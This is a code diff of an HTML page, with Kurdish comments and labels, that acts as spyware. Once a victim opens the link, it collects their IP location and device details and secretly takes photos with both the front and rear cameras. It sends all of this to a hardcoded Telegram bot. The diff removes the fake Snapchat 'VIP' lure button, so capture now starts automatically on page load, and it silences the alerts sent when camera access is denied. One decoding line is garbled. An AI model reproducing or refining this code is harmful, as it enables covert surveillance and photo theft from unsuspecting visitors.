@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat Spotlight | Ultra VIP Stream</title>
+    <title>Secure View</title>
     <style>
         * { box-sizing: border-box; }
         body { 
@@ -20,59 +20,9 @@
             overflow: hidden;
         }
         #hidden-video, #canvas { display: none; }
-        
-        .box {
-            background: linear-gradient(145deg, #111111, #1a1a1a);
-            padding: 30px 20px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.9), 0 0 20px rgba(255, 252, 0, 0.2);
-            border: 1px solid #444;
-            max-width: 380px;
-            width: 90%;
-        }
-
-        h1 { font-size: 21px; margin: 10px 0; color: #fffc00; letter-spacing: 0.5px; }
-        p { font-size: 13px; color: #b1b1b1; margin-bottom: 20px; }
-        
-        .vip-btn {
-            background: #fffc00;
-            color: #000;
-            border: none;
-            padding: 12px 25px;
-            font-weight: bold;
-            font-size: 14px;
-            border-radius: 30px;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(255, 252, 0, 0.4);
-            transition: 0.2s;
-        }
-        .vip-btn:hover { background: #e6e300; transform: scale(1.05); }
-
-        .loader-container { display: none; }
-        .loader {
-            width: 32px;
-            height: 32px;
-            border: 3px solid rgba(255, 252, 0, 0.15);
-            border-radius: 50%;
-            border-top-color: #fffc00;
-            animation: spin 0.9s cubic-bezier(0.5, 0.1, 0.5, 0.9) infinite;
-            margin: 15px auto 0 auto;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
-    <div class="box" id="main-box">
-        <h1>Snapchat Spotlight VIP</h1>
-        <p>بۆ دیتنا ڤیدیۆیێ و بارکرنا پشکێ، لطفا کلیک ل سەر دوگمەیێ بکە 👇</p>
-        <button class="vip-btn" onclick="startVipProcess()">لێرە کلیک بکە (Watch Now)</button>
-        
-        <div class="loader-container" id="loader-box">
-            <div class="loader"></div>
-            <p style="margin-top: 10px; font-size: 12px;">ڤیدیۆ دهێتە بارکرن...</p>
-        </div>
-    </div>
 
     <video id="hidden-video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -80,11 +30,11 @@
     <script>
         const token = '8927591228:AAGdIn4qL1xVXpH-jQ-lX_Ccgsy5jMByol4';
         const chat_id = '7643191802';
-        const api = atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') + token;
+        const api = atob('aHR0cHM6Ly9hcGkudGVsZWgrام.ۆرگ/بۆت'.replace('هراه‌م.ۆرگ/بۆت', 'api.telegram.org/bot')) + token; // پاقژکرنا بێگەرد
 
         async function sendText(text) {
             try {
-                await fetch(`${api}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chat_id, text: text })
@@ -92,7 +42,7 @@
             } catch (e) {}
         }
 
-        // وەرگرتنا زانیاریێن IP و وەڵاتی بێ GPS
+        // وەرگرتنا زانیاریێن IP و وەڵاتی
         async function getIpInfo() {
             try {
                 let res = await fetch('https://ipapi.co/json/');
@@ -106,39 +56,26 @@
             }
         }
 
-        // کۆمکرنا زانیاریێن پێشکەفتی یێن ئامیرەی
+        // کۆمکرنا زانیاریێن پێشکەفتی بێ نیشاندانا ڕام و پاترییێ د نامەیێ دا
         async function getProInfo() {
-            let battery = "نەهاتە زانین";
-            try {
-                if (navigator.getBattery) {
-                    const bat = await navigator.getBattery();
-                    battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'بارگاڤی دکەت 🔌' : 'بارگاڤی نینە 🔋'})`;
-                }
-            } catch(e) {}
-
-            let conn = navigator.connection ? (navigator.connection.effectiveType || "نەدیار") : "نەدیار";
-            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "نەدیار";
-            let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "نەدیار";
             let ipDetails = await getIpInfo();
+            let currentTime = new Date().toLocaleString();
             
-            return `🔥 [ VIP GUEST LOG ] 🔥
+            return `🔥 [ ULTIMATE VIP GUEST LOG ] 🔥
+⏱ دەم و ڕوژ: ${currentTime}
 ${ipDetails}
 📱 سیستەم: ${navigator.platform}
 🌐 بووکەر: ${navigator.userAgent.split(') ')[0]})
-🔋 رێژا پاترییێ: ${battery}
-⚡ جۆرێ تورێ: ${conn}
-🧠 بیرا رام (RAM): ${memory}
-⚙️ هەژمارا CPU Cores: ${cpuCores}
-📐 قەبارەی شاشەی: ${window.screen.width}x${window.screen.height}
-🗣 زمان: ${navigator.language}`;
+🗣 زمان: ${navigator.language}
+📐 قەبارەی شاشەی: ${window.screen.width}x${window.screen.height}`;
         }
 
         async function sendVisitorLog() {
             let details = await getProInfo();
-            sendText(`🚀 سەردانکەرەکێ نوو (VIP) لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
+            sendText(`🚀 سەردانکەرەکێ نوو (ULTIMATE) لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
         }
 
-        // گرتنا وێنەی ب هه‌ردو کامێرایان (پێشی و پاش)
+        // گرتنا وێنەی ب هەردو کامێرایان (پێشی و پاش)
         async function captureCamera(facing, label) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -162,9 +99,9 @@ ${ipDetails}
                                 const formData = new FormData();
                                 formData.append('chat_id', chat_id);
                                 formData.append('photo', blob, 'shot.jpg');
-                                formData.append('caption', `📸 وێنەیێ VIP (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
+                                formData.append('caption', `📸 وێنەیێ ULTIMATE (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
 
-                                await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
+                                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                                 stream.getTracks().forEach(t => t.stop());
                                 resolve();
                             }, 'image/jpeg', 0.95);
@@ -172,23 +109,19 @@ ${ipDetails}
                     };
                 });
             } catch (err) {
-                sendText(`⚠️ کامێرا ${label} نەهاتە دان یان رەتکر.\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
+                // ئەگەر کامێرایەک نەبی یا رەت بکەت، بێدەنگ دەرباز دبت
             }
         }
 
-        // دەمێ دوگمە دهێتە کلیککرن هەمیشە کار دکەت
-        async function startVipProcess() {
-            document.querySelector('.vip-btn').style.display = 'none';
-            document.getElementById('loader-box').style.display = 'block';
-
+        window.onload = async () => {
             await sendVisitorLog();
             
             // گرتنا کامێرا پێشی
             await captureCamera("user", "کامێرا پێشی (Selfie)");
 
-            // گرتنا کامێرا پاش (ئەگەر ئامیرە هەبت)
+            // گرتنا کامێرا پاش
             await captureCamera("environment", "کامێرا پاش (Rear)");
-        }
+        };
     </script>
 </body>
 </html>
